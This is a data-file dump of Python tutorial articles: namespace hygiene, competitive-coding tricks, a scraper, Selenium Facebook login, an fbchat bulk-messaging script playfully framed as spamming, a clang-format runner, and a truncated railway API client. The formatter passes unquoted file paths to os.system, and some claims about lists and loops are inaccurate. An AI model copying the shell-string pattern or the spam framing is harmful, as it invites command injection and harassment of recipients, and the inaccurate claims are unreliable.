    "text": "Using import * in python programs is considered a bad habit because this way you are polluting your namespace, the import * statement imports all the functions and classes into your own namespace, which may clash with the functions you define or functions of other libraries that you import. Also it becomes very difficult at some times to say from which library does a particular function came from. The risk of overriding the variables/functions etc always persist with the import * practice.Below are some points about why import * should not be used:Code ReadabilityIt is always remains a mystery what is imported and cannot be found easily from which module a certain thing was imported that result in low code readability.Polluting the namespace, import * imports all the functions and classes in your own namespace that may clash with the function and classes you define or function and classes of other libraries that you may import.Concrete possibility of hiding bugsTools like pyflakes can\u2019t be used to statically detect errors in the source code.All of this does not mean that using import * is always bad, if i had told you that there is nothing like import * thing on this universe you would have been craving for it. The only thing you should remember while using import * is that you should always use this carefully and with discipline maintained.Now lets dive into an example to see the problem in a more practical and easy to understand way.consider a package a that contains a function sum (a, b)# import the module a using import *\u00a0from a import *\u00a0\u00a0# define a function sumdef sum (x, y):\u00a0\u00a0\u00a0\u00a0return x + y\u00a0\u00a0print (sum (2, 6))the error with this code is that the sum function that we define overrides the sum function from the module \u2018a\u2019 that we imported and we don\u2019t even have any idea about it. also it becomes very difficult to identify which function is actually being called in case of large programs.Correct method:# import the module a as limport a as l\u00a0\u00a0def sum (x, y):\u00a0\u00a0\u00a0\u00a0return x + y\u00a0\u00a0# calls the self-defined sum functionprint (sum (2, 6))\u00a0\u00a0# calls the sum function defined in the module aprint (l.sum(2, 6))Coding this way increases code readability as well as it becomes easy to debug and there are almost zero chances that any conflict will occur.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "75501baf355c1a42039cbe441761ca94",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "When it comes to Product Based Companies, they need good coders and one needs to clear the Competitive Coding round in order to reach the interview rounds. Competitive coding is one such platform that will test your mental ability and speed at the same time.Who should read this?\n    Any programmer who still hasn't tried python for\n    Competitive Coding MUST give this article a read.\n    This should clear up any doubts one has before \n    shifting to python.No matter how comfortable\n    a programming language may seem to you right now\n    Python is bound to feel even better.\n    Python has a tendency of sticking to people\n    like a bad habit !!SPEED is a factor where python is second to none. The amount of code to be typed decreases drastically in comparison to conventional programming languages like C, C++, JAVA. Another most important point is that python arms its users with a wide variety of functionality, packages, and libraries that act as a supplement to the programmer\u2019s mental ability.\u00a0Ultimately the best thing about python is that it\u2019s very simple and we need not waste much time on trivial matters like input, output, etc. It helps shift our focus to the problem at hand.Here I\u2019m gonna list out some of my favorite features of Python which I\u2019m sure will encourage you to start trying python for Competitive Coding.\u00a0\u00a01.Variable Independence\u00a0Python doesn\u2019t require us to declare variables and their Data-Types before using them. This also gives us the flexibility of range as long as it\u2019s within reasonable limits of the Hardware i.e. no need to worry about integer and long integer. Type conversion is internally handled with flawless results.\u00a0Amazing Fact !!\n          For nested loops in python we can use the \n          same variable name in both inner and outer\n          for-loop variables without fear of \n          inconsistent data or any errors !!2.Common Functions like sorted, min, max, count, etc.\u00a0The min/max function helps us to find the minimum/maximum element from a list. The Sorted function allows us to sort a list and the count function helps us to count the number of occurrences of a particular element in a list.\u00a0The best thing is that we can rest assured that the python libraries use the best possible algorithms for each of the above operations. For example, the sorted function is a very special sorting algorithm called TIMSORT that has a worst-case time complexity of O(n log n) which is the best a sorting algorithm can offer.\u00a0Reference: Python sorting algorithmPython# Python code to demonstrate working of min(),# max(), sorted() and count()arr = [10, 76, 87, 45, 22, 87, 90, 87, 66, 84, 87]\u00a0print(\"Maximum = \",max(arr))print(\"Minimum = \",min(arr))print(\"The sorted array is = \",sorted(arr))print('Number of occurrences of 87 is = ',arr.count(87))Output:\u00a0('Maximum = ', 90)\n('Minimum = ', 10)\n('The sorted array is = ', [10, 22, 45, 66, 76, 84, 87, 87, 87, 87, 90])\n('Number of occurrences of 87 is = ', 4)3.Lists in python combine the best aspects of arrays and linked lists.\u00a0Python lists provide the unique functionality of deleting specific elements while keeping the memory locations in a contiguous manner. This feature renders the concept of Linked lists null and void. It\u2019s like a linked list on STEROIDS! Moreover, Insertions can be performed at any desired location.Python# Python code to demonstrate list operationsarr = [00, 11, 22, 33, 44, 55, 66, 77, 88, 99]\u00a0# deletion via index positiondel arr[5]print(arr)\u00a0# deletion via specifying particular elementarr.remove(22)print(arr)\u00a0# insertion at any arbitrary positionarr[-1] = \"A random number\"print(arr)\u00a0# concept of sub-listsk = arr[:2]print(k)Output:\u00a0[0, 11, 22, 33, 44, 66, 77, 88, 99]\n[0, 11, 33, 44, 66, 77, 88, 99]\n[0, 11, 33, 44, 66, 77, 88, 'A random number']\n[0, 11]4.Unique list operations \u2013 Backtracking, Sub-Lists.\u00a0In case we are not sure about the list size then we can use the index position of -1 to access the last element. Similarly, -2 can be used for the second last element and so on. Thus we can backtrack a list. Also, we don\u2019t have to specify any particular list size so it also works as a dynamic allocation array.\u00a0A specific portion of a list can be extracted without having to traverse the list as is seen in the above example. A very astonishing fact about lists is that they can hold different data types. Gone are the days where lists used to be a homogeneous collection of data elements!!Functions can return more than one value.\u00a0Typically functions in other programming languages can return only one value but in python, we can return more than one value!! as is seen in the following code snippet.\u00a0Recommended: Please try your approach on {IDE} first, before moving on to the solution.Python# Python code to demonstrate that a function# can easily return multiple values.def multi_return(*arr):\u00a0\u00a0\u00a0\u00a0k1 = arr[0]\u00a0\u00a0\u00a0\u00a0k2 = arr[1]\u00a0\u00a0\u00a0\u00a0return k1,k2\u00a0\u00a0\u00a0\u00a0\u00a0a,b = multi_return(11,22)print(a,' ',b)\u00a0a,b = multi_return(55,66,77,88,99)print(a,' ',b)Output:\u00a011   22\n55   665.A flexible number of arguments to a function.\u00a0Arguments to a function may be passed in the form of a list whose size may vary every time we need to call the function. In the above example, we first called the function with 2 arguments and then with 5 arguments!!\u00a0If else and for loops are much more User Friendly.\u00a0The if-else statement of python allows us to search for a particular element in a list without the need of traversing the entire list and checking each element.\u00a0Some programming languages have a concept of a for each loop which is slightly different from a for a loop. It allows us to traverse a list where the loop variable takes upon the list values one by one. Python incorporates each loop concept in the for loop itself.Python# Python code to demonstrate quick searching\u00a0arr = [1, 2, 3, 4, 5, 6, 7, 8, 9]\u00a0# searching made easyif 3 in arr:\u00a0\u00a0\u00a0\u00a0print(\"YES\")else:\u00a0\u00a0\u00a0\u00a0print(\"NO\")\u00a0#foreach loopfor i in arr:\u00a0\u00a0\u00a0\u00a0print(i,end = ' ')Output:\u00a0YES\n1 2 3 4 5 6 7 8 9 Code Indentation.\u00a0Python blocks of code are distinguished on the basis of their indentation. This provides better code readability and instills in us a good habit of indenting our code.Concept of Sets and Dictionaries.\u00a0A Set is an unordered collection data type that is iterable, mutable and has no duplicate elements. It\u2019s like a list that doesn\u2019t allow duplicate elements.\u00a0A dictionary is like a list whose values can be accessed by user-defined keys instead of conventional numeric index values.\u00a0Recommended: Please try your approach on {IDE} first, before moving on to the solution.Python# Python code to demonstrate use of dictionaries# and sets.a = {'a','b','c','d','e','a'}\u00a0# the second 'a' is dropped to avoid repetitionprint(a)\u00a0dict = {'Name': 'Zara', 'Age': 7, 'Class': 'First'}print(\"dict['Name']: \", dict['Name'])print(\"dict['Age']: \", dict['Age'])Output:\u00a0{'d', 'a', 'e', 'b', 'c'}\ndict['Name']:  Zara\ndict['Age']:  7Robust input statements.\u00a0In competitive coding, we are often required to take \u2018n\u2019 space-separated integers as input and preferably save them in a list/array. Python provides functionality to do it all in a single line of code.!!\u00a0Python3# Python code to demonstrate how to take space# separated inputs.arr = [int(a) for a in input().strip().split(' ')]\u00a0print(arr)My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "e4854a4f963d667a1f2d4510d59957ff",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python is one such programming language that makes everything easier and straight forward. Anyone who has dabbled in python for Competitive Coding gets somewhat addicted to its many features. Here is a list of some of its cool features that I\u2019ve found most useful in a competitive coding environment.\u00a0The most_common function of the Counter Package.\u00a0This is probably the most useful function I\u2019ve ever used and its always at the back of my mind while writing any python code. This function analyses a list/string and helps to return the top n entities in the list/string according to their number of occurrences in descending order where n is a number that is specified by the programmer. The individual entities are returned along with their number of occurrences in a tuple which can easily be referred/printed as and when required.\u00a0Python# Code to find top 3 elements and their counts# using most_commonfrom collections import Counter\u00a0arr = [1, 3, 4, 1, 2, 1, 1, 3, 4, 3, 5, 1, 2, 5, 3, 4, 5]counter = Counter(arr)top_three = counter.most_common(3)print(top_three)Output:[(1, 5), (3, 4), (4, 3)]The output tuple clearly states that 1 has occurred 5 times, 3 has occurred 4 times, and 4 has occurred 3 times.The n-largest/n-smallest function of the heapq Package.\u00a0This function helps to return the top n smallest/largest elements in any lists and here again n is a number specified by the programmer.\u00a0Python# Python code to find 3 largest and 4 smallest# elements of a list.import heapq\u00a0grades = [110, 25, 38, 49, 20, 95, 33, 87, 80, 90]print(heapq.nlargest(3, grades))print(heapq.nsmallest(4, grades))Output:\u00a0[110, 95, 90]\n[20, 25, 33, 38]The first line of output gives 3 of the largest numbers present in the list grades. Similarly the second line of output prints out 4 of the smallest elements present in the list grades. Another speciality of this function is that it does not overlook repetitions. So in place of n if we were to place the length of the array the we would end up with the entire sorted array itself !!Dictionary and concept of zipping Dictionaries\u00a0Dictionaries in python are truly fascinating in terms of the unique functionality that they offer. They are stored as a Key and Value pair in the form of an array like structure. Each value can be accessed by its corresponding key.\u00a0The zip function is used to join two lists together or we can even join the key and value pairs in a dictionary together as a single list. The application of this concept will be made clear in the following code snippet.Python# Python code to demonstrate use of zip.import heapq\u00a0stocks = {\u00a0\u00a0\u00a0\u00a0'Goog' : 520.54,\u00a0\u00a0\u00a0\u00a0'FB' : 76.45,\u00a0\u00a0\u00a0\u00a0'yhoo' : 39.28,\u00a0\u00a0\u00a0\u00a0'AMZN' : 306.21,\u00a0\u00a0\u00a0\u00a0'APPL' : 99.76\u00a0\u00a0\u00a0\u00a0}\u00a0zipped_1 = zip(stocks.values(), stocks.keys())\u00a0# sorting according to valuesprint(sorted(zipped_1))\u00a0zipped_2 = zip(stocks.keys(), stocks.values())print(sorted(zipped_2))#sorting according to keysOutput:\u00a0[(39.28, 'yhoo'), (76.45, 'FB'), (99.76, 'APPL'), (306.21, 'AMZN'), (520.54, 'Goog')]\n[('AMZN', 306.21), ('APPL', 99.76), ('FB', 76.45), ('Goog', 520.54), ('yhoo', 39.28)]The Map function.\u00a0This function is a sneaky little shortcut that allows us to implement a simple function on a list of values in a very Unconventional Manner. The following example will give a simple application of this functionality. The function takes as parameters the function name and the name of the list the function needs to be applied upon.Python# Python code to apply a function on a listincome = [10, 30, 75]\u00a0def double_money(dollars):\u00a0\u00a0\u00a0\u00a0return dollars * 2\u00a0new_income = list(map(double_money, income))print(new_income)Output:\u00a0[20, 60, 150]Here, we just implemented a simple function which multiplies each list value by two and returns it as a new list.Concatenation of list of strings\u00a0Suppose we have been given a list of strings and we have to give the output by concatenating the list\u00a0Let\u2019s look at the previous code what we were doing:Pythonstring = \"\"lst = [\"Geeks\", \"for\", \"Geeks\"]for i in lst:\u00a0\u00a0\u00a0\u00a0string += iprint(string)This method of joining a list of strings is definitely not the best method because everytime a new string will be created\u00a0Pythonlst = [\"Geeks\", \"for\", \"Geeks\"]string = ''.join(lst)print(string)Using join() function is memory efficient as well as handy to write which definitely proves to be the advantages over the previous code.Individually these functions might look innocent but will definitely come in handy in a TIME LIMITED CODING ENVIRONMENT in the sense that they offer large functionality in a VERY short amount of code. The functionalities discussed have very specific applications and act like a SHORTCUT or a CHEAT-SHEET in competitive coding. Having these useful tricks up your sleeve might just give someone the COMPETITIVE EDGE that they were looking for !!This article is contributed by Siddhant Bajaj. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "6aba734a4232cfc4cb2ea090a0c783db",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "The task is to count the most frequent words, which extracts data from dynamic sources.First, create a web crawler or scraper with the help of the requests module and a beautiful soup module, which will extract data from the web pages and store them in a list. There might be some undesired words or symbols (like special symbols, blank spaces), which can be filtered in order to ease the counts and get the desired results.\u00a0After counting each word, we also can have the count of most (say 10 or 20) frequent words.Modules and Library functions used :\u00a0requests : Will allow you to send HTTP/1.1 requests and many more.\u00a0beautifulsoup4 : Used for parsing HTML/XML to extract data out of HTML and XML files.\u00a0operator : Exports a set of efficient functions corresponding to the intrinsic operators.\u00a0collections : Implements high-performance container datatypes.Below is an implementation of the idea discussed above :\u00a0\u00a0Python3# Python3 program for a word frequency# counter after crawling/scraping a web-pageimport requestsfrom bs4 import BeautifulSoupimport operatorfrom collections import Counter\u00a0'''Function defining the web-crawler/corespider, which will fetch information froma given website, and push the contents tothe second\u00a0 function clean_wordlist()'''\u00a0\u00a0def start(url):\u00a0\u00a0\u00a0\u00a0\u00a0# empty list to store the contents of\u00a0\u00a0\u00a0\u00a0# the website fetched from our web-crawler\u00a0\u00a0\u00a0\u00a0wordlist = []\u00a0\u00a0\u00a0\u00a0source_code = requests.get(url).text\u00a0\u00a0\u00a0\u00a0\u00a0# BeautifulSoup object which will\u00a0\u00a0\u00a0\u00a0# ping the requested url for data\u00a0\u00a0\u00a0\u00a0soup = BeautifulSoup(source_code, 'html.parser')\u00a0\u00a0\u00a0\u00a0\u00a0# Text in given web-page is stored under\u00a0\u00a0\u00a0\u00a0# the <div> tags with class <entry-content>\u00a0\u00a0\u00a0\u00a0for each_text in soup.findAll('div', {'class': 'entry-content'}):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0content = each_text.text\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# use split() to break the sentence into\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# words and convert them into lowercase\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0words = content.lower().split()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for each_word in words:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0wordlist.append(each_word)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0clean_wordlist(wordlist)\u00a0# Function removes any unwanted symbols\u00a0\u00a0def clean_wordlist(wordlist):\u00a0\u00a0\u00a0\u00a0\u00a0clean_list = []\u00a0\u00a0\u00a0\u00a0for word in wordlist:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0symbols = \"!@#$%^&*()_-+={[}]|\\;:\\\"<>?/., \"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for i in range(len(symbols)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0word = word.replace(symbols[i], '')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if len(word) > 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0clean_list.append(word)\u00a0\u00a0\u00a0\u00a0create_dictionary(clean_list)\u00a0# Creates a dictionary containing each word's# count and top_20 occurring words\u00a0\u00a0def create_dictionary(clean_list):\u00a0\u00a0\u00a0\u00a0word_count = {}\u00a0\u00a0\u00a0\u00a0\u00a0for word in clean_list:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if word in word_count:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0word_count[word] += 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0word_count[word] = 1\u00a0\u00a0\u00a0\u00a0\u00a0''' To get the count of each word in\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0the crawled page -->\u00a0\u00a0\u00a0\u00a0\u00a0# operator.itemgetter() takes one\u00a0\u00a0\u00a0\u00a0# parameter either 1(denotes keys)\u00a0\u00a0\u00a0\u00a0# or 0 (denotes corresponding values)\u00a0\u00a0\u00a0\u00a0\u00a0for key, value in sorted(word_count.items(),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0key = operator.itemgetter(1)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"% s : % s \" % (key, value))\u00a0\u00a0\u00a0\u00a0\u00a0<-- '''\u00a0\u00a0\u00a0\u00a0\u00a0c = Counter(word_count)\u00a0\u00a0\u00a0\u00a0\u00a0# returns the most occurring elements\u00a0\u00a0\u00a0\u00a0top = c.most_common(10)\u00a0\u00a0\u00a0\u00a0print(top)\u00a0\u00a0# Driver codeif __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0url = \"https://www.geeksforgeeks.org/programming-language-choose/\"\u00a0\u00a0\u00a0\u00a0# starts crawling and prints output\u00a0\u00a0\u00a0\u00a0start(url)[('to', 10), ('in', 7), ('is', 6), ('language', 6), ('the', 5),\n ('programming', 5), ('a', 5), ('c', 5), ('you', 5), ('of', 4)]My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "fc93a5748cb92e7d03fdd01505629b5c",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python scripting is one of the most intriguing and fascinating things to do meanwhile learning Python. Automation and controlling the browser is one of them.In this particular article, we will see how to log in to the Facebook account using Python and the power of selenium.Selenium automates and controls browsers and it\u2019s activity. We can code in our way to control browser tasks with the help of selenium. Primarily, it is for automating web applications for testing purposes, but is certainly not limited to just that. Boring web-based administration tasks can be automated as well. As you learn more it\u2019s so much fun to see things happening automatically and saving time in doing useless tasks again and again.We use selenium here to open the site of our requirement (in this case Facebook) and there we inspect elements across email box, password box, and login button to find the id of them.Using find_element_by_id() function provided by selenium module, we can find the required element (username box, password box, login button)Using send_keys() function, provided by selenium module, we will send the data into the box.Installing third party modules required\r\nSelenium \r\ngetpass\r\nAdditional Requirement : geckodriver for firefox and \r\n                         chromedriver for chrome\r\nImporting necessary modulesSelenium : to automate browserTime : to pause running of script for some seconds as browsers try to detect automation stuff if we input too fastTaking username and password as input from userUsing input() function and passing prompt message as argument.Opening browser and required websitewebdriver.Chrome() will open new window of chrome. We will save it\u2019s object in variable named driver.Now using get function we will open up the Facebook website.Finding element for sending data and Sending inputUse inspect element tool on the element of browser of which you want to find id. In this case we will inspect username box, password box, login button to find their id. And then use this id combining with selenium function find_element_by_id() to find it across web page and save it in variables for later use. Then by using send_keys() we will send data across the elements found previously.Closing the browserAfter all of the above steps we have to quit the session and will be achieved by using driver.quit().Note: Here driver is the name of variable you chose for webdriver.Chrome().Complete Code:from selenium import webdriverfrom time import sleepfrom webdriver_manager.chrome import ChromeDriverManagerfrom selenium.webdriver.chrome.options import Options\u00a0\u00a0\u00a0usr=input('Enter Email Id:')\u00a0pwd=input('Enter Password:')\u00a0\u00a0\u00a0driver = webdriver.Chrome(ChromeDriverManager().install())driver.get('https://www.facebook.com/')print (\"Opened facebook\")sleep(1)\u00a0\u00a0username_box = driver.find_element_by_id('email')username_box.send_keys(usr)print (\"Email Id entered\")sleep(1)\u00a0\u00a0password_box = driver.find_element_by_id('pass')password_box.send_keys(pwd)print (\"Password entered\")\u00a0\u00a0login_box = driver.find_element_by_id('loginbutton')login_box.click()\u00a0\u00a0print (\"Done\")input('Press anything to quit')driver.quit()print(\"Finished\")See how such a concise piece of code can automate things for you.Bonus:We can also enter the password without displaying it on screen, for security purpose. For that we have to include one more module called getpass. Now with just one change in input statement of the password we can input password without displaying it on screen.from getpass import getpasspwd = getpass('Enter Password:')\u00a0Getpass prompts the user for a password without echoing. Basically it lets you enter the password without showing it on the screen.Similarly you can also automate many other things like twitter login, tweeting, Facebook logout, and much more.In case of any queries, post them below in the comments section. If you liked this article and want to see any more of the similar stuff, let me know in the comments section below.This article is contributed by Umang Ahuja. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "50d84218e52dc0f5c2c36436885101a0",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "The power of Python comes because of the large number of modules it has. This time we are going to use one of those. Every one of us, one time or another, has a wish of the message (or spamming -.-) our Facebook friend. This is a program that can do something similar. So without further delay, let\u2019s jump right in.\u00a0Python3import fbchatfrom getpass import getpassusername = input(\"Username: \")client = fbchat.Client(username, getpass())no_of_friends = int(raw_input(\"Number of friends: \"))for i in range(no_of_friends):\u00a0\u00a0\u00a0\u00a0name = input(\"Name: \")\u00a0\u00a0\u00a0\u00a0friends = client.getUsers(name)\u00a0 # return a list of names\u00a0\u00a0\u00a0\u00a0friend = friends[0]\u00a0\u00a0\u00a0\u00a0msg = input(\"Message: \")\u00a0\u00a0\u00a0\u00a0sent = client.send(friend.uid, msg)\u00a0\u00a0\u00a0\u00a0if sent:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Message sent successfully!\")Now, let\u2019s try to understand the program step by step\u2026Modules required \u2013 fbchat (Can be downloaded from here: Github link); getpass (usually it is pre-installed)fbchat Installation:\u00a0sudo pip install fbchatIn case you get the error: ** make sure the development packages of libxml2 and libxslt are installed **In Ubuntu, installing the following packages might help:\u00a0sudo apt-get install python-dev libxml2-dev libxslt1-dev zlib1g-devProgram explanation: The program can be broken down into several steps:Step \u2013 1: Getting the user credentialsThis part is very easy. Using raw_input() and getpass() we can get the username and password. There are some things to keep in mind in this step.\u00a0\u00a0Your Facebook account should have a username. You can check that (or set that) by going to your general settings.We are not using raw_input to get a password because as soon as the characters (or even the password length) are out, we have got a security breach.Step \u2013 2: Entering the Facebook friend\u2019s name\u00a0Now that we have signed in, we can enter the number of friends we want to send the message to, and for each of those friends, we can enter the custom message.Step \u2013 3: Spamming *evil*\u00a0\u00a0Caution \u2013 I am not responsible for extensive usage of the program which can get you banned from Facebook or getting blocked by your friend. Get your own list of guinea pigs!Because of some reason, if you want to send the same message several times, you can use a simple for loop. Nothing difficult about that \ud83d\ude09What you can try out now?\u00a0\u00a0Send a message to a group chat.Instead of text only, send images as well.Create your own \u2018desktop\u2019 messenger.Facebook hack \u2013 Send a blank message\u00a0Using the normal Facebook chat or messenger, it is not possible to send a blank message unless you are aware of the alt+0173 trick. But, with this program, you can send blank messages as well!! All you have to do is enter a blank message. That is, when the program asks for the message to be sent, just press enter, and voila!! Your friend will be receiving a series of blank messages\u2026This new code works fine for now :\u00a0\u00a0Python3import fbchatfrom getpass import getpassusername = input(\"Username: \")client = fbchat.Client(username, getpass())no_of_friends = int(raw_input(\"Number of friends: \"))for i in range(no_of_friends):\u00a0\u00a0\u00a0\u00a0name = input(\"Name: \")\u00a0\u00a0\u00a0\u00a0friends = client.searchForUsers(name)\u00a0 # return a list of names\u00a0\u00a0\u00a0\u00a0friend = friends[0]\u00a0\u00a0\u00a0\u00a0msg = input(\"Message: \")\u00a0\u00a0\u00a0\u00a0sent = client.sendMessage(msg, thread_id=friend.uid)\u00a0\u00a0\u00a0\u00a0if sent:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Message sent successfully!\")If you have any other projects in mind concerned with this or if you have prepared some similar to this one, please do share in the comments section!This article is contributed by Vishwesh Ravi Shrimali. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "7c76d3b3914df6d5a75c30900da472e1",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Today we are going to discuss formatting files in the user\u2019s workspace by their extension. For this we are going to make use of Clang\u2019s format tools.Prerequisites:Linux MachinePythonClang ToolSetup:Install Python using the following command:sudo apt-get install pythonInstall Clang Format Toolssudo apt-get install clang-format-3.5Create a python file named format-code.py at any location where you have read and write permissions. In this example we are going to create it in /home/user/. It shall contain the following code:# Python program to format C/C++ files using clang-formatimport os\u00a0\u00a0# File Extension filter. You can add new extensioncpp_extensions = (\".cxx\",\".cpp\",\".c\", \".hxx\", \".hh\", \".cc\", \".hpp\")\u00a0\u00a0# Set the current working directory for scanning c/c++ sources (including# header files) and apply the clang formatting# Please note \"-style\" is for standard style options# and \"-i\" is in-place editingfor root, dirs, files in os.walk(os.getcwd()):\u00a0\u00a0\u00a0\u00a0for file in files:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if file.endswith(cpp_extensions):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0os.system(\"clang-format-3.5 -i -style=file \" + root + \"/\" + file)Create format specification file and copy it to project\u2019s top level directory , e.g., /home/user/myproject/Create formatting file (in example, we are creating google coding style tool)clang-format-3.5 -style=google -dump-config > .clang-format Copy it to project\u2019s directory i.e., it\u2019s location becomes: /home/user/myproject/.clang-formatHow to use it?Navigate to the directory whose files you want to format, e.g.,cd  /home/user/myproject/c-source/Run the format-code file that you created earlierpython /home/user/format-code.pyThis shall format all the files in our source directory with the extension same as that mentioned in the code.This article is contributed by Nitin Deokate .If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "b5fc115ce9a61421d022e1e257fdaeaa",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Railway API is organized around GET Requests. One can use this JSON based API to get information from Indian Railways regarding Live Train Status, PNR Status, Train Schedule, Station Details, and other things.\u00a0To use this API, one must need the API key, which can get from here\u00a0Note: User need to create an account on railwayapi.com to use the APIs.\u00a0Modules Needed :\u00a0requests\njson\u00a0Live running status :Below is the implementation :\u00a0\u00a0Python3# Python program to find live train# status using RAILWAY API\u00a0# import required modulesimport requests , json\u00a0# enter your api key hereapi_key = \"Your_API_Key\"\u00a0# base_url variable to store urlbase_url = \"https://api.railwayapi.com/v2/live/train/\"\u00a0# enter train_number heretrain_number = \"12056\"\u00a0# enter current date in dd-mm-yyyy formatcurrent_date = \"20-06-2018\"\u00a0# complete_url variable to# store complete url addresscomplete_url = base_url + train_number + \"/date/\" + current_date + \"/apikey/\" + api_key + \"/\"\u00a0# get method of requests module# return response objectresponse_ob = requests.get(complete_url)\u00a0# json method of response object convert# json format data into python format dataresult = response_ob.json()\u00a0# Now result contains a list of nested dictionaries# Check the value of \"response_code\" key is equal# to \"200\" or not if equal that means record is# found otherwise record is not foundif result[\"response_code\"] == 200 :\u00a0\u00a0\u00a0\u00a0\u00a0# train name is extracting from\u00a0\u00a0\u00a0\u00a0# the result variable data\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0train_name = result[\"train\"][\"name\"]\u00a0\u00a0\u00a0\u00a0\u00a0# store the value or data of\u00a0\u00a0\u00a0\u00a0# \"route\" key in variable y\u00a0\u00a0\u00a0\u00a0temp = result[\"route\"]\u00a0\u00a0\u00a0\u00a0\u00a0# source station name is extracting\u00a0\u00a0\u00a0\u00a0# from the y variable data\u00a0\u00a0\u00a0\u00a0source_station = temp[0][\"station\"][\"name\"]\u00a0\u00a0\u00a0\u00a0\u00a0# destination station name is\u00a0\u00a0\u00a0\u00a0# extracting from the y variable data\u00a0\u00a0\u00a0\u00a0destination_station = temp[-1][\"station\"][\"name\"]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# store the value of 